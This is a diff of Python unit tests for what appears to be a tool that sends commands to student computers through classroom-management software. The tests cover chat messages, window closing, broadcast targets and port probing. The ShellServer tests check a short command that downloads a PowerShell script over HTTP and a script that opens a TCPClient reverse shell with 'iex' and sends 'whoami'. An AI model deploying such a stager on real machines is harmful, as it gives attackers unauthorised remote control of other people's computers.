@@ -508,3 +508,97 @@ class RemoteControlTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class ChatAndWindowTests(unittest.TestCase):
+    """聊天消息、按窗口关闭、宣告多目标与端口探测。"""
+
+    def test_chat_payload_frames_utf16_text(self):
+        payload = appcmd.chat_payload("你好")
+        total, kind, reserved, units = struct.unpack_from("<IIII", payload, 0)
+        self.assertEqual(total, len(payload))
+        self.assertEqual(kind, 0x800)
+        self.assertEqual(reserved, 0)
+        # 第 4 个字段是 UTF-16 码元数，含结尾空字符，否则学生端只显示第一个字。
+        self.assertEqual(units, 3)
+        self.assertEqual(payload[16:], "你好".encode("utf-16-le") + b"\x00\x00")
+
+    def test_chat_payload_rejects_empty_text(self):
+        with self.assertRaises(ValueError):
+            appcmd.chat_payload("")
+        with self.assertRaises(ValueError):
+            appcmd.chat_payload("a\x00b")
+
+    def test_announce_targets_covers_broadcast_and_peers(self):
+        with patch.object(
+            core.teacher, "local_networks", return_value=[("192.168.50.22", 24)]
+        ):
+            targets = core.announce_targets(
+                "192.168.50.22", "224.0.0.1", 4705, ["10.0.0.9"]
+            )
+        self.assertIn(("224.0.0.1", 4705), targets)
+        self.assertIn(("192.168.50.255", 4705), targets)
+        self.assertIn(("192.168.50.1", 4705), targets)
+        self.assertIn(("10.0.0.9", 4705), targets)
+        # 本机地址不往自己身上发宣告。
+        self.assertNotIn(("192.168.50.22", 4705), targets)
+
+    def test_announce_targets_deduplicates_peers(self):
+        with patch.object(
+            core.teacher, "local_networks", return_value=[("192.168.50.22", 24)]
+        ):
+            targets = core.announce_targets(
+                "192.168.50.22", "224.0.0.1", 4705, ["224.0.0.1", "10.0.0.9"]
+            )
+        self.assertEqual(len(targets), len(set(targets)))
+
+    def test_probe_detects_open_and_closed_ports(self):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(1)
+        port = listener.getsockname()[1]
+        try:
+            reachable, _detail = core.probe("127.0.0.1", port, timeout=1.0)
+        finally:
+            listener.close()
+        self.assertTrue(reachable)
+        closed, detail = core.probe("127.0.0.1", port, timeout=0.5)
+        self.assertFalse(closed)
+        self.assertTrue(detail)
+
+    def test_chat_and_close_require_targets(self):
+        with self.assertRaises(ValueError):
+            core.send_chat([], "hi")
+        with self.assertRaises(ValueError):
+            core.close_window([], 0x120A3C)
+
+
+class ShellServerTests(unittest.TestCase):
+    """反弹终端的监听、脚本服务与命令长度。"""
+
+    def test_command_stays_within_channel_capacity(self):
+        server = core.ShellServer(bind_ip="127.0.0.1", local_ip="127.0.0.1")
+        self.addCleanup(server.close)
+        server.start()
+        self.assertGreater(server.port, 0)
+        self.assertGreater(server.http_port, 0)
+        command = server.command()
+        self.assertLessEqual(len(command), core.shell.MAX_COMMAND_CHARS)
+        self.assertIn(
+            "http://127.0.0.1:%d/s.ps1" % server.http_port,
+            command,
+        )
+        script = server.script()
+        self.assertIn("TCPClient('127.0.0.1',%d)" % server.port, script)
+        self.assertIn("iex", script)
+
+    def test_command_requires_running_server(self):
+        with self.assertRaises(ValueError):
+            core.ShellServer(local_ip="127.0.0.1").command()
+
+    def test_send_without_connection_returns_false(self):
+        server = core.ShellServer(bind_ip="127.0.0.1", local_ip="127.0.0.1")
+        self.addCleanup(server.close)
+        server.start()
+        self.assertFalse(server.send("whoami"))
+        self.assertFalse(server.connected)
